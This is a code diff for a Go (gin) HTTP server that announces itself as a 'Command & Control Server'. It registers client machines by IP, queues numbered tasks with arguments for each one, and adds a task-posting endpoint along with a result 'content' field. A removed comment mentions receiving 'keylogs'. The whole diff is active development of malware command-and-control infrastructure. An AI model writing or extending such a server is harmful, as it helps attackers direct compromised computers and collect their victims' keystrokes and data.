@@ -4,7 +4,6 @@ import (
 	"fmt"
 	"math/rand"
 	"net/http"
-	"os"
 	"time"
 
 	"github.com/gin-gonic/gin"
@@ -18,20 +17,20 @@ type register struct {
 }
 
 type task struct {
-  Name    string  `json:"name"`
-  ID      int     `json:"id"`     // 1 = func ...; 2 = func ...
-  Arg1    string  `json:"arg1"`   // argv[1]
-  Arg2    string  `json:"arg2"`   // argv[2]
+	Name string `json:"name"` // name
+	ID   int    `json:"id"`   // 1 = func ...; 2 = func ...
+	Arg1 string `json:"arg1"` // argv[1]
+	Arg2 string `json:"arg2"` // argv[2]
 }
 
 type result struct {
-  Name    string  `json:"name"`
-  Status  int     `json:"status"` // 0 = gud; 1 = bad
-  // TODO: find out how to receive the darn keylogs 
+	Name    string `json:"name"`
+	Status  int    `json:"status"`  // 0 = gud; 1 = bad
+	Content string `json:"content"` // NOTE: to translate JSON to struct use unmarshall
 }
 
-var users   []register
-var tasks   []task
+var users []register
+var tasks []task
 var results []result
 
 func getUsers(c *gin.Context) {
@@ -40,23 +39,31 @@ func getUsers(c *gin.Context) {
 
 func addUser(c *gin.Context) {
 	var newUser register
+
+	// Bind JSON payload to newUser
+	if err := c.BindJSON(&newUser); err != nil {
+		c.IndentedJSON(http.StatusBadRequest, gin.H{"message": "invalid request payload"})
+		return
+	}
+
+	// Generate a random name and get the client's IP address
 	newUser.Name = generateRandomString(6)
 	newUser.IP = c.ClientIP()
-  for _, user := range users {
-    if user.IP == newUser.IP {
-      c.IndentedJSON(http.StatusConflict, gin.H{"message":"IP already exists"})
-      return
-    }
-  }
-
-	hostname, err := os.Hostname()
-	if err != nil {
-		hostname = "unknown"
+	if newUser.IP == "" {
+		c.IndentedJSON(http.StatusBadRequest, gin.H{"message": "failed to detect IP address"})
+		return
 	}
-	newUser.Hostname = hostname
 
+	// Check for duplicate IP
+	for _, user := range users {
+		if user.IP == newUser.IP {
+			c.IndentedJSON(http.StatusConflict, gin.H{"message": "IP already exists"})
+			return
+		}
+	}
+
+	// Add new user to the list
 	newUser.Type = "POST"
-
 	users = append(users, newUser)
 	fmt.Println(newUser)
 	c.IndentedJSON(http.StatusCreated, newUser)
@@ -85,15 +92,38 @@ func generateRandomString(n int) string {
 }
 
 func fetchTasks(c *gin.Context) {
-  name := c.Param("name")
+	name := c.Param("name")
 
-  for _, a := range tasks {
-    if a.Name == name {
-      c.IndentedJSON(http.StatusOK, tasks)
-      return
-    }
-  }
-  c.IndentedJSON(http.StatusNotFound, gin.H{"message": "could not find any tasks..."})
+	var userTasks []task
+	for _, a := range tasks {
+		if a.Name == name {
+			userTasks = append(userTasks, a)
+		}
+	}
+	if len(userTasks) > 0 {
+		c.IndentedJSON(http.StatusOK, userTasks)
+		return
+	}
+	c.IndentedJSON(http.StatusNotFound, gin.H{"message": "could not find any tasks..."})
+}
+
+func postTask(c *gin.Context) {
+	var newTask task
+	user := c.Param("name")
+
+	for _, a := range users {
+		if a.Name == user {
+			if err := c.BindJSON(&newTask); err != nil {
+				c.IndentedJSON(http.StatusBadRequest, gin.H{"message": "failed to add new task"})
+				return
+			}
+			newTask.Name = user
+			tasks = append(tasks, newTask)
+			c.IndentedJSON(http.StatusCreated, gin.H{"message": "added new task to waitlist"})
+			return
+		}
+	}
+	c.IndentedJSON(http.StatusNotFound, gin.H{"message": "did not find user with specified name"})
 }
 
 func main() {
@@ -101,7 +131,7 @@ func main() {
 	var Port string
 
 	fmt.Println("---------[ Command & Control Server ]---------")
-fmt.Print("Host IP: ")
+	fmt.Print("Host IP: ")
 	fmt.Scanln(&IP)
 	fmt.Print("Host Port: ")
 	fmt.Scanln(&Port)
@@ -111,11 +141,12 @@ fmt.Print("Host IP: ")
 	router.GET("/users", getUsers)
 	router.POST("/users", addUser)
 	router.GET("/users/:name", getUserByName)
-  router.GET("/tasks/:name", fetchTasks)
-  /*
-    router.POST("/tasks/:name", postTask)
-    router.GET("/results/:name", getResults)
-    router.POST("/results/:name", postResults)
-  */
+	router.GET("/tasks/:name", fetchTasks)
+	router.POST("/tasks/:name", postTask)
+	/*
+		router.GET("/results/:name", getResults)
+		router.POST("/results/:name", postResults)
+	*/
 	router.Run(IP + ":" + Port)
 }
+
